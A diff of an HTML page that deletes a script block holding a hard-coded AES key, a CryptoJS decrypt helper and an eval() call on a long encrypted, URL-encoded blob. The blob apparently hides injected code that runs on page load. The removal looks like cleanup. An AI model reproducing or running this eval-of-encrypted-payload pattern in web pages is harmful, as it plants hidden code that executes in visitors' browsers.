@@ -208,18 +208,5 @@
         modal.style.display = "none"; // Hide the modal
       };
     </script>
-    <script>
-      let secretKey = 'bruceisgenius';
-      
-      function aesDecode(encodedText) {
-          if (!secretKey) {
-              throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
-          }
-          const decodedText = decodeURIComponent(encodedText);
-          const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-          return bytes.toString(CryptoJS.enc.Utf8);
-      }
-      eval(aesDecode(`U2FsdGVkX1%2FQXLavAoBXByI3bpYY7Zcg2K1rr2qEh3MoJblCgKMtx3tcnsmgw%2B2%2FmvxRE7xcVEPXMrEhvc%2F5bxGpUpM%2FEBi9E79JN74F2qo9J1zSP39U0091ILTmmOIQ9EGv%2FvZcmhzeO5%2BeW4hqrnpvPvrVul9l3wAiZCJqmItTKSoZ8d1f5aXB0kU5MqsbbvpnPmgDJMDgjKuJLgaGj6NKkeqPLrKNQOAE34pq3%2B4tdTKPa83Pci6hvxGdtGQv3I4Z3vRgRxym8xm%2Bim8Q57Tuuh%2FyzahRGtwUdGNunAAQAmbtaaj8fq%2BB1aouAdTruLKG%2B%2B6jnJJWMSDaDlhDodGpLPZxsU7Qn44UmxMVvgDb3EhwL9vHP%2FZuX4naJRDO93KNbhDEG5IMn9%2BeMRyepNneUYl1FEx51hmTHcZN2fCwkBtIQwD3rxlKYF44jsuRLUThGGH90QgPIU%2BXAwIC9lIpbmiA4A6hBRu9WxofnnYWyD1egNV5m4685oPsrQeXFOaGTSIu6fzyY19Ci%2FgTdlu0yYuc572qOwoyVsQB6qf0IuIOpTMOQkAa2ivH2k4r2JyUHb3SctvFlMa9kYzxCfjbrf5VaLwFB8Nm56OdIQHvFqHSZMCjyq%2BIWZaS%2FWJ7JH7qtlGT5nV%2Flyf66vdf8xkUfOkXbW83DTEsIBS3ZX2lA24TUifN3gMfUK%2FpGlGfT1teLbKNsDdbHu6GE24XNv3tQY1s%2FOE5gf%2BAgH7K2zD5hgsadNteOmKVJXCAUkMMzic4KcgBghtBlEUCYWkpdPlzt59eNJUQP2QT53xZDHjdYqkRue%2B0ZN9dDnlGlhQV49aD4lRzKLE%2Fzd7W474coOft7FkghHJf8prgd67yehleqNn5CX3%2FiEndsIFamsvod6JNNlj8TB1XRQZAiFQ%2FJDlekdyPcaSPJ6BIiOU1w1pzbB%2Fc%2BxFK4Crs0ATK4tbxlJCKXVxZgy3f62k8ny6Wt1AcHO6%2BsYrQwFdhO3cpkP4YgG1eusn9V06%2F5bO%2BVnZBkuP4Q1yN4LMyS0KUviqtsAZlV64i71PBeB55BY3opuAqRymRdpfM3OWjxN9EICSPmnMZgKIJTkxepx7zXAwxmlwuHc3%2FPGqOlYi4pHHpehYOBE22ncI4kf1X8j46gayK9qPN0IGIvQzmpkJ7cnurzUTdwOFzFUI992S5BLUlTUv%2FG2m7azEchTmcP%2BzY%2BQ14BKzfZwvaEpNv04zXubKBBuiVQVLDNMEHt1wZMDPhytHBhw6QRC6qyp71Ew0SgsI1T5nMb5tw2GNsb%2BLZ5TJxJRHYfyri6%2Fp8d1TwPLPWSm3zXtqOKW%2FFkes2aSJXGkTf88i%2FqskXOhT%2BlbL5CfDXuyaLUUff%2BPMPqCvKon5Iev2q6EY%2F9HfCn8GEDOcBDdlRX4PkTOGW7vatc4HFaj9fzyAk7LwbiVgKIbZcRrCqksed13SrBMYNV56JyeZ4jjAfEpioiuVussDQ1fc%2FTNSkpLmP39nSptWZoeeEwe%2FUQKeaHTJNBWj%2FIrQwgK0JpBktHNB9f28m0jQ8cSl8XVABagHRsVYM1a913oMtgw%2FkwWAa4SNhZBE2e2Py9YkdSuY9cz2i5z8V8LahBfJvbNzAjxkETs3D%2FdTZuQ6V5f6byTzeG%2FZSxiePcLB%2BlrhGcf9M7oF8qOGqfXb4So1vhCBMvXQHvgNZALGLu%2FeW0ol7TaMyVoOz1OLOE2nrNNB2JtrA9HqouVZLdTRRjbGnEM4iEa8s00E6MBZ7muH5pIqt%2Fzs%3D`));
-    </script>
   </body>
 </html>
